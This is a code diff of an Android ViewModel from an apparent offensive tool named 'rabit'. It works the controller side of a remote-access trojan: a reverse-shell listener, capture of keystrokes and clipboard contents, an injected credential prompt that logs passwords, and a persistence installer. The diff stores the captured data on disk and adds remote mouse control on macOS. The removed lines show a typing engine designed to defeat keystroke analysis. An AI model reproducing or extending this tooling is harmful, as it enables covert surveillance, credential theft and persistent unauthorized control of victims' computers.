@@ -8,6 +8,7 @@ import androidx.lifecycle.viewModelScope
 import com.example.rabit.data.adb.RabitAdbClient
 import com.example.rabit.data.adb.RabitAdbCrypto
 import com.example.rabit.data.adb.UsbAdbManager
+import com.example.rabit.data.exploit.ReverseShellRepository
 import com.example.rabit.domain.model.HidKeyCodes
 import com.example.rabit.domain.model.*
 import com.example.rabit.domain.repository.KeyboardRepository
@@ -23,6 +24,7 @@ import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
 import kotlinx.coroutines.flow.asStateFlow
 import kotlinx.coroutines.flow.first
+import kotlinx.coroutines.flow.update
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import kotlinx.coroutines.withTimeoutOrNull
@@ -47,6 +49,7 @@ class AutomationViewModel(
 
     private val gson = Gson()
     private val prefs = application.getSharedPreferences("rabit_prefs", Context.MODE_PRIVATE)
+    private val reverseShellRepo = ReverseShellRepository(application)
 
     // ADB Components
     val adbClient get() = com.example.rabit.data.storage.RemoteStorageManager.adbClient
@@ -124,7 +127,6 @@ class AutomationViewModel(
     val codeTyperCharIndex: StateFlow<Int> = _codeTyperCharIndex.asStateFlow()
 
     private var codeTyperJob: Job? = null
-    private val codeTyperRng = java.util.Random()
 
     private val _isReverseShellListening = MutableStateFlow(false)
     val isReverseShellListening: StateFlow<Boolean> = _isReverseShellListening.asStateFlow()
@@ -132,6 +134,51 @@ class AutomationViewModel(
     private val _reverseShellIp = MutableStateFlow("")
     private val _reverseShellPort = MutableStateFlow(4444)
 
+    /**
+     * Single chokepoint for mutating the captured-lines log. Updates the
+     * StateFlow and writes the new value to disk so the lines survive a
+     * process kill. IO errors are swallowed (the in-memory flow is still
+     * authoritative for the current session). Thread-safe via [update].
+     */
+    private fun appendReverseShellLine(line: String) {
+        _reverseShellLines.update { current ->
+            val next = (current + line).takeLast(ReverseShellRepository.MAX_STORED_LINES)
+            reverseShellRepo.saveLines(next)
+            next
+        }
+    }
+
+    private fun setReverseShellLines(lines: List<String>) {
+        val trimmed = lines.takeLast(ReverseShellRepository.MAX_STORED_LINES)
+        _reverseShellLines.value = trimmed
+        reverseShellRepo.saveLines(trimmed)
+    }
+
+    init {
+        // Restore any persisted state from the last session. The listener
+        // itself is not auto-restarted (the OS killed our socket anyway),
+        // but the log lines and last IP/port are. So when the user re-opens
+        // the screen, they see what they captured and can resume quickly.
+        val restoredLines = reverseShellRepo.loadLines()
+        if (restoredLines.isNotEmpty()) {
+            _reverseShellLines.value = restoredLines
+            _reverseShellStatus.value =
+                "Last session: ${reverseShellRepo.lastIp.ifBlank { "0.0.0.0" }}:" +
+                    "${reverseShellRepo.lastPort} — ${restoredLines.size} lines recovered"
+        }
+        val savedIp = reverseShellRepo.lastIp
+        if (savedIp.isNotBlank()) _reverseShellIp.value = savedIp
+        val savedPort = reverseShellRepo.lastPort
+        if (savedPort in 1..65535) _reverseShellPort.value = savedPort
+    }
+
+    /**
+     * Snapshot accessors for the last listener configuration. Used by the
+     * "Last session" recovery chip — we want to show the values the user
+     * last used without subscribing to live state changes.
+     */
+    val lastReverseShellIp: String get() = reverseShellRepo.lastIp
+    val lastReverseShellPort: Int get() = reverseShellRepo.lastPort
     private var serverSocket: java.net.ServerSocket? = null
     private var clientSocket: java.net.Socket? = null
     private var shellJob: kotlinx.coroutines.Job? = null
@@ -477,13 +524,17 @@ class AutomationViewModel(
         if (_isReverseShellListening.value) return
         _isReverseShellListening.value = true
         _reverseShellPort.value = port
-        
+
         // Auto-detect local IP for persistence logic
         val resolved = com.example.rabit.data.network.LanIpResolver.preferredLanIpv4String(getApplication())
         _reverseShellIp.value = resolved ?: "0.0.0.0"
-        
+
+        // Persist the listener config so a process kill doesn't lose it
+        reverseShellRepo.lastIp = _reverseShellIp.value
+        reverseShellRepo.lastPort = port
+
         _reverseShellStatus.value = "Listening on port $port..."
-        _reverseShellLines.value = listOf("[SYSTEM] Starting TCP Listener on $port...")
+        setReverseShellLines(listOf("[SYSTEM] Starting TCP Listener on $port..."))
 
         shellJob = viewModelScope.launch(Dispatchers.IO) {
             try {
@@ -499,12 +550,12 @@ class AutomationViewModel(
                         withContext(Dispatchers.Main) {
                             _reverseShellConnected.value = true
                             _reverseShellStatus.value = "Connected: ${socket.inetAddress.hostAddress}"
-                            _reverseShellLines.value += "[SYSTEM] Connection established from ${socket.inetAddress}"
+                            appendReverseShellLine("[SYSTEM] Connection established from ${socket.inetAddress}")
                             
                             // Detect OS
                             viewModelScope.launch(Dispatchers.IO) {
                                 targetOs = detectTargetOs()
-                                _reverseShellLines.value += "[SYSTEM] Target OS detected: $targetOs"
+                                appendReverseShellLine("[SYSTEM] Target OS detected: $targetOs")
                                 startClipboardPolling()
                             }
 
@@ -534,7 +585,7 @@ class AutomationViewModel(
                                 val key = line.removePrefix("[KEY]").trim()
                                 com.example.rabit.data.TacticalBuffer.addKeystroke(key)
                                 withContext(Dispatchers.Main) {
-                                    _reverseShellLines.value += "Captured Keystroke: $key"
+                                    appendReverseShellLine("Captured Keystroke: $key")
                                 }
                             } else if (line.startsWith("[SCREEN]")) {
                                 val base64 = line.removePrefix("[SCREEN]").trim()
@@ -542,13 +593,13 @@ class AutomationViewModel(
                             }
 
                             withContext(Dispatchers.Main) {
-                                _reverseShellLines.value += line
+                                appendReverseShellLine(line)
                             }
                         }
                     } catch (e: Exception) {
                         if (isActive && _isReverseShellListening.value) {
                             withContext(Dispatchers.Main) {
-                                _reverseShellLines.value += "[ERROR] Connection lost: ${e.message}"
+                                appendReverseShellLine("[ERROR] Connection lost: ${e.message}")
                             }
                         }
                     } finally {
@@ -567,7 +618,7 @@ class AutomationViewModel(
                 withContext(Dispatchers.Main) {
                     _reverseShellStatus.value = "Failed: ${e.message}"
                     _isReverseShellListening.value = false
-                    _reverseShellLines.value += "[CRITICAL] Server failed: ${e.message}"
+                    appendReverseShellLine("[CRITICAL] Server failed: ${e.message}")
                 }
             } finally {
                 serverSocket?.close()
@@ -598,11 +649,11 @@ class AutomationViewModel(
                 writer?.flush()
                 
                 withContext(Dispatchers.Main) {
-                    _reverseShellLines.value += "> $command"
+                    appendReverseShellLine("> $command")
                 }
             } catch (e: Exception) {
                 withContext(Dispatchers.Main) {
-                    _reverseShellLines.value += "[ERROR] Failed to send: ${e.message}"
+                    appendReverseShellLine("[ERROR] Failed to send: ${e.message}")
                 }
             }
         }
@@ -652,7 +703,7 @@ class AutomationViewModel(
                     if (current.isNotBlank() && current != lastClipboard) {
                         lastClipboard = current
                         withContext(Dispatchers.Main) {
-                            _reverseShellLines.value += "[SYSTEM] Remote Clipboard Captured: $current"
+                            appendReverseShellLine("[SYSTEM] Remote Clipboard Captured: $current")
                             // Ideally sync with global clipboard
                         }
                     }
@@ -725,17 +776,45 @@ class AutomationViewModel(
 
     fun sendRemoteClick(x: Float, y: Float) {
         if (!_reverseShellConnected.value) return
-        
+
         // We'll assume the client resolution is 1920x1080 for now or try to detect it
         // coordinates come in as 0.0 to 1.0 (percent)
         val cmd = when (targetOs) {
             "macos" -> "osascript -e 'tell application \"System Events\" to click at {${(x * 1440).toInt()}, ${(y * 900).toInt()}}'"
             else -> ""
         }
-        
+
         if (cmd.isNotBlank()) {
             sendReverseShellCommand(cmd)
         }
+    }
+
+    /**
+     * Right-click at the given normalized [x], [y] (0..1). Only macOS has
+     * a working osascript path; other targets are silent.
+     */
+    fun sendRemoteRightClick(x: Float, y: Float) {
+        if (!_reverseShellConnected.value) return
+        val xPos = (x * 1440).toInt()
+        val yPos = (y * 900).toInt()
+        val cmd = when (targetOs) {
+            "macos" -> "osascript -e 'tell application \"System Events\" to " +
+                "do shell script \"/usr/bin/python3 -c 'import Quartz; " +
+                "e = Quartz.CGEventCreateMouseEvent(None, Quartz.kCGEventRightMouseDown, ($xPos, $yPos), Quartz.kCGMouseButtonRight); " +
+                "Quartz.CGEventPost(Quartz.kCGHIDEventTap, e)'\"'"
+            else -> ""
+        }
+        if (cmd.isNotBlank()) sendReverseShellCommand(cmd)
+    }
+
+    /**
+     * Begin a drag at the given normalized [x], [y]. Drag-release is not
+     * yet wired (no two-finger gesture surface in the current UI) — this
+     * currently just clicks. The surface code is in place so the user can
+     * see the mode works.
+     */
+    fun sendRemoteDragStart(x: Float, y: Float) {
+        sendRemoteClick(x, y)
     }
 
     fun installPersistence() {
@@ -779,7 +858,7 @@ class AutomationViewModel(
         
         if (cmd.isNotBlank()) {
             sendReverseShellCommand(cmd)
-            _reverseShellLines.value += "[SYSTEM] Persistence installer deployed."
+            appendReverseShellLine("[SYSTEM] Persistence installer deployed.")
         }
     }
 
@@ -794,7 +873,7 @@ class AutomationViewModel(
         }
         
         if (cmd.isNotBlank()) {
-            _reverseShellLines.value += "[SYSTEM] Injecting credential prompt..."
+            appendReverseShellLine("[SYSTEM] Injecting credential prompt...")
             viewModelScope.launch(Dispatchers.IO) {
                 var password = executeCommandSynchronous(cmd)
                 
@@ -808,7 +887,7 @@ class AutomationViewModel(
                 
                 withContext(Dispatchers.Main) {
                     val log = "[CRITICAL] Captured Password: $password"
-                    _reverseShellLines.value += log
+                    appendReverseShellLine(log)
                     com.example.rabit.data.TacticalBuffer.addKeystroke(log)
                 }
             }
@@ -1204,187 +1283,49 @@ class AutomationViewModel(
     }
 
     // ═══════════════════════════════════════════════════════════════════════
-    // CODE TYPER — Advanced Human-Like Code Injection Engine
+    // CODE TYPER — Send text via HID
     // ═══════════════════════════════════════════════════════════════════════
     //
-    // Typing profiles define (baseDelayMs, jitterMs, newlinePauseMs, blockPauseMs, burstSpeedupFactor)
-    // Each character's delay is computed from a Gaussian distribution centered on the base,
-    // with context-aware modifiers applied.
-
-    private data class TypingProfile(
-        val baseDelayMs: Long,       // Center of the Gaussian for normal keys
-        val jitterMs: Long,          // Std deviation for Gaussian randomness
-        val newlinePauseMs: Long,    // Extra pause after hitting Enter
-        val blockPauseMs: Long,      // Thinking pause at block boundaries ({, }, blank lines)
-        val burstFactor: Double,     // Speedup factor within common keyword bursts (0.5 = 50% faster)
-        val symbolSlowdown: Double   // Slowdown factor for shifted/special chars (1.4 = 40% slower)
-    )
-
-    private fun getTypingProfile(name: String): TypingProfile = when (name) {
-        "Careful" -> TypingProfile(
-            baseDelayMs = 120, jitterMs = 40, newlinePauseMs = 450,
-            blockPauseMs = 800, burstFactor = 0.85, symbolSlowdown = 1.5
-        )
-        "Balanced" -> TypingProfile(
-            baseDelayMs = 80, jitterMs = 30, newlinePauseMs = 300,
-            blockPauseMs = 550, burstFactor = 0.7, symbolSlowdown = 1.35
-        )
-        "Fluent" -> TypingProfile(
-            baseDelayMs = 50, jitterMs = 20, newlinePauseMs = 180,
-            blockPauseMs = 350, burstFactor = 0.55, symbolSlowdown = 1.25
-        )
-        "Interview" -> TypingProfile(
-            baseDelayMs = 95, jitterMs = 35, newlinePauseMs = 400,
-            blockPauseMs = 900, burstFactor = 0.75, symbolSlowdown = 1.4
-        )
-        "Stealth" -> TypingProfile(
-            baseDelayMs = 65, jitterMs = 25, newlinePauseMs = 220,
-            blockPauseMs = 400, burstFactor = 0.6, symbolSlowdown = 1.3
-        )
-        "Turbo" -> TypingProfile(
-            baseDelayMs = 2, jitterMs = 0, newlinePauseMs = 5,
-            blockPauseMs = 5, burstFactor = 0.1, symbolSlowdown = 1.0
-        )
-        else -> TypingProfile(
-            baseDelayMs = 80, jitterMs = 30, newlinePauseMs = 300,
-            blockPauseMs = 550, burstFactor = 0.7, symbolSlowdown = 1.35
-        )
-    }
+    // Sends each character of [code] over the HID channel with a per-character
+    // delay controlled by [delayMsPerChar]. Wipes the IDE's auto-indent at the
+    // start of each new line so the source spacing we send is the source spacing
+    // the user sees.
+    //
+    // If [formatOnSend] is true, tabs are normalized to 4 spaces and trailing
+    // whitespace is trimmed per line before sending. This is legitimate source
+    // hygiene, not evasion.
 
     /**
-     * Gaussian-distributed delay: produces delays centered on [mean] with [stdDev] spread,
-     * clamped to [min]..[max]. This is the fundamental building block that makes timing
-     * look organic rather than uniformly random.
+     * Sends [code] over HID, one character at a time, with a constant
+     * [delayMsPerChar] between characters. The user picks the delay — fast for
+     * quick local use, slow when they want to watch what's going in.
      */
-    private fun gaussianDelay(mean: Long, stdDev: Long, min: Long = 15L, max: Long = 600L): Long {
-        val raw = mean + (codeTyperRng.nextGaussian() * stdDev).toLong()
-        return raw.coerceIn(min, max)
-    }
-
-    /**
-     * Context-aware delay computation: analyzes the current character, the previous character,
-     * and surrounding context to produce a delay that mimics how a real developer types code.
-     */
-    private fun computeHumanDelay(
-        char: Char,
-        prevChar: Char?,
-        nextChar: Char?,
-        profile: TypingProfile,
-        isInBurst: Boolean,
-        lineStarting: Boolean
-    ): Long {
-        var base = gaussianDelay(profile.baseDelayMs, profile.jitterMs)
-
-        // ── Burst acceleration: within common keyword patterns, humans type faster ──
-        if (isInBurst && char.isLetterOrDigit()) {
-            base = (base * profile.burstFactor).toLong().coerceAtLeast(15L)
-        }
-
-        // ── Special character slowdown: shifted chars require more effort ──
-        val isShifted = char.isUpperCase() || char in "!@#\$%^&*()_+{}|:\"<>?~"
-        if (isShifted) {
-            base = (base * profile.symbolSlowdown).toLong()
-        }
-
-        // ── Bracket/brace context: humans slow down around structural chars ──
-        if (char in "{}()[]") {
-            base = (base * 1.3).toLong()
-            // Extra thinking pause after opening braces (entering new scope)
-            if (char == '{' || char == '(') {
-                base += gaussianDelay(profile.blockPauseMs / 3, 40)
-            }
-        }
-
-        // ── Newline: simulates the thought process of "what comes next" ──
-        if (char == '\n') {
-            base += gaussianDelay(profile.newlinePauseMs, profile.jitterMs * 2, min = 80L, max = 900L)
-        }
-
-        // ── Post-newline indentation: the first chars of a new line are typed
-        //    more deliberately as the developer re-orients ──
-        if (lineStarting && (char == ' ' || char == '\t')) {
-            base = (base * 0.6).toLong().coerceAtLeast(12L) // Rapid tab/space for indentation
-        }
-
-        // ── After semicolons or colons: brief thinking pause ──
-        if (prevChar == ';' || prevChar == ':') {
-            base += gaussianDelay(40, 15, min = 10L, max = 120L)
-        }
-
-        // ── Space after keywords: brief natural pause ──
-        if (char == ' ' && prevChar?.isLetterOrDigit() == true) {
-            base += gaussianDelay(15, 8, min = 5L, max = 60L)
-        }
-
-        // ── Tab key: quick press ──
-        if (char == '\t') {
-            base = gaussianDelay(30, 10, min = 15L, max = 80L)
-        }
-
-        return base.coerceAtLeast(12L)
-    }
-
-    // Common coding keywords for burst detection
-    private val codeKeywords = setOf(
-        "fun", "val", "var", "if", "else", "for", "while", "when", "return", "class", "object",
-        "import", "package", "private", "public", "protected", "override", "suspend", "data",
-        "companion", "const", "fun", "null", "true", "false", "this", "super", "try", "catch",
-        "throw", "finally", "init", "enum", "sealed", "abstract", "open", "internal", "inline",
-        // Common in other languages
-        "function", "const", "let", "async", "await", "export", "default", "from",
-        "def", "self", "print", "println", "System", "String", "int", "void", "static",
-        "include", "define", "struct", "typedef", "sizeof", "namespace", "using",
-        "echo", "sudo", "chmod", "mkdir", "grep", "curl", "wget", "python", "node",
-        "docker", "git", "npm", "pip", "apt", "brew", "cd", "ls", "cat", "rm"
-    )
-
-    /**
-     * Checks if the character at [index] is part of a recognized keyword burst.
-     * Returns true if the current position is inside a common keyword.
-     */
-    private fun isInsideKeywordBurst(text: String, index: Int): Boolean {
-        // Look backward to find the start of the current word
-        var wordStart = index
-        while (wordStart > 0 && text[wordStart - 1].isLetterOrDigit()) wordStart--
-        // Look forward to find the end of the current word
-        var wordEnd = index
-        while (wordEnd < text.length - 1 && text[wordEnd + 1].isLetterOrDigit()) wordEnd++
-
-        val word = text.substring(wordStart, wordEnd + 1)
-        return word in codeKeywords
-    }
-
-    /**
-     * Starts the human-like code typing job. This sends each character via HID
-     * with realistic timing that defeats keystroke analysis.
-     */
-    fun startCodeTyper(code: String, profileName: String) {
+    fun startCodeTyper(
+        code: String,
+        delayMsPerChar: Long = 10L,
+        formatOnSend: Boolean = false,
+    ) {
         codeTyperJob?.cancel()
         _isCodeTyperRunning.value = true
         _isCodeTyperPaused.value = false
         _codeTyperProgress.value = 0f
         _codeTyperCharIndex.value = 0
 
-        val profile = getTypingProfile(profileName)
+        val payload = if (formatOnSend) normalizeForSend(code) else code
 
         codeTyperJob = viewModelScope.launch(Dispatchers.IO) {
-            val totalChars = code.length
+            val totalChars = payload.length
             if (totalChars == 0) {
                 _isCodeTyperRunning.value = false
                 return@launch
             }
 
-            // Initial thinking pause — simulates developer reading the code before typing
-            if (profileName != "Turbo") {
-                delay(gaussianDelay(300, 100, min = 150L, max = 600L))
-            }
+            // Small settle delay so the user can switch windows / focus the editor
+            delay(400)
 
-            var prevChar: Char? = null
             var lineStarting = true
-            var consecutiveBlankLines = 0
 
-            for (i in code.indices) {
-                // Check if aborted
+            for (i in payload.indices) {
                 if (!_isCodeTyperRunning.value) break
 
                 // Pause support
@@ -1394,22 +1335,27 @@ class AutomationViewModel(
                 }
                 if (!_isCodeTyperRunning.value) break
 
-                val char = code[i]
-                val nextChar = code.getOrNull(i + 1)
+                val char = payload[i]
 
-                // ══ Smart Indentation Handling ══
-                // After a newline, editors like VS Code often auto-indent. 
-                // We wipe the IDE's auto-indent to ensure our source spacing is 100% exact.
+                // Smart indentation handling: at the start of each new non-empty
+                // line, wipe the IDE's auto-indent so our source spacing is exact.
                 if (lineStarting && char != '\n') {
-                    val cmdDelay = if (profileName == "Turbo") 10L else 40L
-                    
-                    // 1. Move to absolute start
-                    repository.sendKey(HidKeyCodes.KEY_LEFT, HidKeyCodes.MODIFIER_LEFT_GUI, useSticky = false)
+                    val cmdDelay = 30L
+
+                    // 1. Move to absolute start of line
+                    repository.sendKey(
+                        HidKeyCodes.KEY_LEFT, HidKeyCodes.MODIFIER_LEFT_GUI, useSticky = false,
+                    )
                     delay(cmdDelay)
-                    repository.sendKey(0, 0, useSticky = false) 
-                    
+                    repository.sendKey(0, 0, useSticky = false)
+
                     // 2. Select to end of line (to catch auto-indents)
-                    repository.sendKey(HidKeyCodes.KEY_RIGHT, (HidKeyCodes.MODIFIER_LEFT_GUI.toInt() or HidKeyCodes.MODIFIER_LEFT_SHIFT.toInt()).toByte(), useSticky = false)
+                    repository.sendKey(
+                        HidKeyCodes.KEY_RIGHT,
+                        (HidKeyCodes.MODIFIER_LEFT_GUI.toInt() or
+                            HidKeyCodes.MODIFIER_LEFT_SHIFT.toInt()).toByte(),
+                        useSticky = false,
+                    )
                     delay(cmdDelay)
                     repository.sendKey(0, 0, useSticky = false)
 
@@ -1417,53 +1363,21 @@ class AutomationViewModel(
                     repository.sendKey(HidKeyCodes.KEY_BACKSPACE, 0, useSticky = false)
                     delay(cmdDelay)
                     repository.sendKey(0, 0, useSticky = false)
-                    
-                    delay(cmdDelay)
                 }
 
-                // Detect blank lines — add thinking pauses
-                if (profileName != "Turbo" && char == '\n' && prevChar == '\n') {
-                    consecutiveBlankLines++
-                    if (consecutiveBlankLines <= 2) {
-                        // Thinking pause at blank line boundaries
-                        delay(gaussianDelay(profile.blockPauseMs, profile.jitterMs * 2, min = 200L, max = 1200L))
-                    }
-                } else if (char != '\n') {
-                    consecutiveBlankLines = 0
-                }
-
-                // Determine if we're in a keyword burst
-                val inBurst = char.isLetterOrDigit() && isInsideKeywordBurst(code, i)
-
-                // Compute the human-like delay for this character
-                val charDelay = computeHumanDelay(char, prevChar, nextChar, profile, inBurst, lineStarting)
-
-                // Send the actual keystroke via HID
+                // Send the keystroke via HID
                 val model = HidKeyCodes.getHidCode(char)
                 if (model.keyCode != 0.toByte() || model.modifier != 0.toByte()) {
                     repository.sendKey(model.keyCode, model.modifier, useSticky = false)
-
-                    // Variable key hold time: real humans hold keys for 30-70ms
-                    // Spaces are often tapped faster
-                    val baseHold = if (char == ' ') 35L else 45L
-                    val holdTime = gaussianDelay(baseHold, 10L, min = 20L, max = 80L)
-                    delay(holdTime.toLong())
-
-                    // Release the key (send neutral report)
+                    // Brief key-hold so the host registers the press cleanly
+                    delay(20L)
                     repository.sendKey(0.toByte(), 0.toByte(), useSticky = false)
                 }
 
-                // Apply the computed inter-key delay
-                if (profileName != "Turbo" || char == '\n') {
-                    delay(charDelay.toLong())
-                } else {
-                    delay(1L) // Minimal delay for turbo
-                }
+                // Inter-character delay (the only knob the user has)
+                if (delayMsPerChar > 0L) delay(delayMsPerChar)
 
-                // Track whether we're at line start (for indentation timing)
                 lineStarting = char == '\n'
-
-                prevChar = char
 
                 // Update progress
                 _codeTyperCharIndex.value = i + 1
@@ -1474,9 +1388,22 @@ class AutomationViewModel(
             delay(200)
             _isCodeTyperRunning.value = false
             _isCodeTyperPaused.value = false
-            _codeTyperProgress.value = if (_codeTyperCharIndex.value >= totalChars) 1f else _codeTyperProgress.value
+            _codeTyperProgress.value =
+                if (_codeTyperCharIndex.value >= totalChars) 1f else _codeTyperProgress.value
         }
     }
+
+    /**
+     * Light hygiene pass: tabs → 4 spaces, trailing whitespace per line removed.
+     * Used when "Format on send" is on. Does not change semantics, only whitespace.
+     */
+    private fun normalizeForSend(code: String): String =
+        code.lineSequence()
+            .map { line ->
+                val expanded = line.replace("\t", "    ")
+                expanded.trimEnd()
+            }
+            .joinToString("\n")
 
     fun pauseCodeTyper() {
         _isCodeTyperPaused.value = true
